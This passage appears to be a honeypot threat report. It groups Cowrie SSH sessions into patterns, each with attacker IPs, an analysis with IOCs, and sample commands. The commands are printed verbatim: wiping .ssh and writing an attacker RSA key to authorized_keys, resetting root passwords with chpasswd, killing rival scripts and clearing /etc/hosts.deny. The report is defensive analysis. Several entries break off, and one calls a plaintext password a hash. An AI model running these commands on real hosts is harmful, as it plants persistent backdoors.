echo "user@2025\nzGdtjELwtkqO\nzGdtjELwtkqO\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: f329c0f9986f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.165.22.246

#### Analysis

**Attack Type:** Backdoor installation (credential injection) with reconnaissance  
**Objective:** Gain persistent remote access via SSH and elevate privileges to root.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to hide files,  
- Injecting a public‑key into `.ssh/authorized_keys`,  
- Changing the root password (`echo "root:EkNAHKZTQPt7"|chpasswd|bash`),  
- Killing suspicious processes (`pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **202.165.22.246**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **EkNAHKZTQPt7**  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  

**Threat Level:** High – the attacker has root access and a persistent SSH backdoor.  

**Brief Summary:** The attacker injected an SSH key, set a new root password, and performed system reconnaissance to establish a remote control foothold on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:EkNAHKZTQPt7"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: 92a5809843f3...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 20.127.224.153

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain privileged remote access via SSH (root account) on the honeypot.  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys` and set restrictive permissions.  
- Reset root password (`chpasswd`).  
- Deleted temporary files and killed processes to hide activity.  
- Ran system‑info commands (cpu, memory, uname, crontab) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **20.127.224.153**  
- Public key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- Empty `/etc/hosts.deny` file created.  

**Threat Level:** **High** – root password reset and SSH backdoor provide full system control.  

**Brief Summary:** The attacker installed a privileged SSH backdoor by injecting an authorized key and resetting the root password, while also gathering system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ZAhfsexwmleT"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ec050a664b88...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 150.5.169.138

#### Analysis

**Attack Type:**  
Backdoor installation / credential takeover

**Objective:**  
Gain persistent root access on the honeypot by installing an SSH key and resetting the root password.

**Techniques & Tools Used:**
- `chattr`/`lockr` to lock `.ssh` directory
- `chmod` to restrict permissions
- `echo … > .ssh/authorized_keys` to inject a public‑key
- `chpasswd` to set root password (`root:MP3vZewU5vem`)
- Killing processes (`pkill -9`) and modifying `/etc/hosts.deny`
- System reconnaissance commands (CPU info, memory, uname, top, etc.)

**Indicators of Compromise (IOCs):**
- Attacker IP: **150.5.169.138**  
- Public SSH key string:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File paths: `.ssh/authorized_keys`, `/etc/hosts.deny`

**Threat Level:** High – the attacker has gained root access and installed a persistent backdoor, potentially enabling further malicious activity.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `.ssh` directory, reset the root password, and performed system reconnaissance to establish persistence and gather host details.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:MP3vZewU5vem"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: aa0f905db640...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 161.132.68.222

#### Analysis



#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:zLh9yaqnRiZu"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7417111975eb...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 218.37.207.187

#### Analysis

**Attack Type:**  
Backdoor installation (SSH key injection) combined with reconnaissance.

**Objective:**  
Gain persistent remote access by adding an authorized SSH key, then collect system information for later exploitation or botnet recruitment.

**Techniques & Tools Used:**
- `chattr -ia` / `lockr` to lock the `.ssh` directory.
- Removal and recreation of `.ssh`, echoing a public‑key into `authorized_keys`.
- `chmod -R go= ~/.ssh` to restrict permissions.
- Attempts to change user passwords via `passwd`.
- System‑info commands (`cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `whoami`, `lscpu`, `df`) for reconnaissance.

**Indicators of Compromise (IOCs):**
- Attacker IP: **218.37.207.187**  
- Public SSH key string:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nRKcdkuQ7qpwZ\nRKcdkuQ7qpwZ"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nRKcdkuQ7qpwZ\nRKcdkuQ7qpwZ\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: a1edd63ef3f2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.161.212

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (attempted password change).

**2. Objective:**  
Gain remote access to the system through SSH and collect basic system information.

**3. Techniques & Tools Used:**
- `chattr`/`lockr` to set immutable attributes on `.ssh`.
- Creation of `.ssh`, setting permissions, adding an RSA public key to `authorized_keys`.
- Multiple attempts with `passwd` to change the user password.
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `whoami`, `lscpu`, `df`).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **101.47.161.212**  
- RSA public key string in the `authorized_keys` file:
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```

**5. Threat Level:** **Medium** – moderate sophistication with a clear backdoor attempt and system reconnaissance.

**6. Brief Summary:**
The attacker attempted to install an SSH backdoor by injecting a public key into the honeypot’s `.ssh` directory, while also gathering basic system information for potential further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1\nusfE99hSo9cu\nusfE99hSo9cu"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1\nusfE99hSo9cu\nusfE99hSo9cu\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+11 more)
```

---

### Pattern: f08c66b59724...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.226.118

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain persistent remote access (SSH key injection + root password reset)  
**Techniques:**  
- `lockr -ia .ssh` – file‑hiding tool  
- Creation of `.ssh/authorized_keys` with a public SSH key  
- `chpasswd` to set the root password (`root:XmOjIC4vQVwi`)  
- Killing processes and modifying `/etc/hosts.deny` to hide activity  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.226.118** (Singapore)  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Files: `/tmp/secure.sh`, `/tmp/auth.sh`, `lockr`, `chpasswd` usage  

**Threat Level:** **High** – persistent remote access with root privileges.  
**Brief Summary:** The attacker injected an SSH key and reset the root password to establish a backdoor for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:XmOjIC4vQVwi"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 9849c3ee24a7...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.161

#### Analysis

**Attack Type:** Backdoor installation / botnet recruitment  
**Objective:** Gain remote SSH access to the host (and possibly use it as a node in a botnet) while gathering system details for reconnaissance.  

**Techniques & Tools:**
- **SSH key injection** – created `.ssh/authorized_keys` with a hard‑coded RSA public key.
- **Permission manipulation** – `chmod -R go= ~/.ssh` to restrict access.
- **Password attempt** – multiple `passwd` calls with preset passwords (likely ineffective without root privileges).
- **System reconnaissance** – commands such as `cat /proc/cpuinfo`, `free -m`, `uname`, `top`, `df -h`, etc.  

**Indicators of Compromise (IOCs):**
- RSA key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`  
- Commands: `lockr -ia .ssh`, `chattr -ia .ssh`.  

**Threat Level:** Medium – the attacker demonstrates intent to establish a remote backdoor but lacks root privileges and may not fully succeed.  

**Brief Summary:** The attacker attempted to install an SSH backdoor by injecting a public key into the honeypot’s `.ssh/authorized_keys` and set a password, while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "Huawei@123\nw3mR4ntFgXG7\nw3mR4ntFgXG7"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "Huawei@123\nw3mR4ntFgXG7\nw3mR4ntFgXG7\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 97983956681d...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.194.255

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Install an SSH key for remote control, then collect system information (CPU, memory, OS) likely for bot‑net recruitment or cryptomining.  

**Techniques:**  
- `chattr -ia` and `lockr -ia` to hide/lock the `.ssh` directory.  
- Creation of `.ssh`, adding an authorized key (`ssh-rsa …`).  
- Permission change `chmod -R go= ~/.ssh`.  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `uname`, `lscpu`, `df`) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.194.255**  
- SSH key string in `.ssh/authorized_keys` (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ…`).  
- Use of `lockr` tool (likely a custom or known malicious utility).  

**Threat Level:** Medium – moderate sophistication, potential for remote exploitation and bot‑net deployment.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory while hiding it, then executed a series of system‑information queries to gather host details, suggesting preparation for remote control or bot‑net activity.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "wangziyun\nzMDSDAm6ukCj\nzMDSDAm6ukCj"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "wangziyun\nzMDSDAm6ukCj\nzMDSDAm6ukCj\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 675e551afac6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 124.226.212.169

#### Analysis

**Attack Type:**  
Backdoor installation / credential compromise (SSH key injection + root password reset)

**Objective:**  
Gain privileged remote access to the host via SSH and establish persistent control.

**Techniques Used:**
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`, `chmod`)
- Injection of a hard‑coded RSA public key into `authorized_keys`
- Resetting the root password with `chpasswd`
- Killing suspicious processes (`pkill -9 secure.sh, auth.sh, sleep`) to hide activity
- System reconnaissance (CPU info, memory usage, file listings)

**Indicators of Compromise (IOCs):**
- Attacker IP: **124.226.212.169**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Root password hash: `root:uLqw1Pp1JuN0`

**Threat Level:** **High** – the attacker successfully installs a persistent SSH backdoor and resets root credentials, enabling full control.

**Brief Summary:**  
The attacker injected an RSA key into the host’s `.ssh/authorized_keys`, reset the root password, and killed potential monitoring processes, establishing a high‑impact SSH backdoor for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uLqw1Pp1JuN0"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5ff51c55492e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.142.188

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain root access and establish remote control via SSH.  

**Techniques:**  
- Injected an RSA public key into `~/.ssh/authorized_keys` (immutable, no group permissions).  
- Attempted to change the root password using `chpasswd`.  
- Cleared temporary scripts (`secure.sh`, `auth.sh`) and killed related processes.  
- Executed system‑info commands for reconnaissance.

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.142.188** (Singapore).  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:dBcQ6DvipMnd"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
w
uname -m
cat /proc/cpuinfo | grep model | grep name | wc -l
top
... (+5 more)
```

---

### Pattern: 43105d9fa956...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 114.80.32.225

#### Analysis

**1. Attack Type:**  
Backdoor installation – the attacker is trying to gain privileged access on the system via SSH and root credentials.

**2. Objective:**  
Create a permanent remote entry (SSH key + root password) and hide or kill any monitoring processes, enabling future exploitation.

**3. Techniques & Tools Used:**
- **SSH Key Injection** (`echo … > ~/.ssh/authorized_keys` with a random RSA key).
- **Root Password Reset** (`echo "root:5S4e16zv3Aiy"|chpasswd|bash`).
- **File Attribute Manipulation** (`chattr -ia .ssh`, `lockr -ia .ssh`) – likely to hide the SSH directory.
- **Process Killing** (`pkill -9 secure.sh; pkill -9 auth.sh; pkill -9 sleep`).
- **System Information Gathering** (CPU, memory, ls, crontab, uname, whoami, lscpu, df) – reconnaissance.

**4. Indicators of Compromise (IOCs):**
- IP: `114.80.32.225`
- RSA key string in `authorized_keys`:  
  `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`
- Root password: `5S4e16zv3Aiy`

**5. Threat Level:** **High** – the attacker successfully injected a SSH key and reset root credentials, giving full system control.

**6. Brief Summary:**  
The attacker installed a backdoor by injecting an SSH key and resetting the root password, while hiding the SSH directory and killing monitoring processes to maintain persistent access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:5S4e16zv3Aiy"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e781ee909120...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.217.161

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection & root credential modification)  
**Objective:** Gain persistent remote access to the host by adding an unauthorized SSH key and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`)  
- Injection of a malicious RSA public key into `authorized_keys`  
- Password change via `chpasswd` (root: Q02p1AMT3bvh)  
- Process termination and cleanup (`pkill -9`, `rm -rf /tmp/*`)  
- System reconnaissance (`cpuinfo`, `free`, `top`, `uname`, `lscpu`, `df`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 45.78.217.161 (Singapore)  
- SSH key string: `

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Q02p1AMT3bvh"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 8c69f89be1dc...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 189.47.10.81

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access to the host using an injected RSA key; gather system details for profiling.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) and permission changes (`chmod`).  
- Injection of a public SSH key into `authorized_keys`.  
- System reconnaissance commands (CPU info, memory usage, top, uname, whoami, lscpu, df).  

**Indicators of Compromise (IOCs):**  
- IP: 189.47.10.81 (Brazil)  
- RSA public key string in the command: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File path: `.ssh/authorized_keys`

**Threat Level:** Medium to High – the attacker successfully installs a backdoor and gathers system info, enabling future exploitation.

**Brief Summary:** The attacker injected an SSH key into the host’s authorized keys, restricted permissions on the `.ssh` directory, and collected detailed system information for profiling.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123456\nuGmSLjLckygi\nuGmSLjLckygi"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123456\nuGmSLjLckygi\nuGmSLjLckygi\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 1a4ee5ada469...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.226.118

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection + system reconnaissance

**Objective:**  
Gain remote SSH access to the target and gather detailed system information for further exploitation or monitoring.

**Techniques Used:**
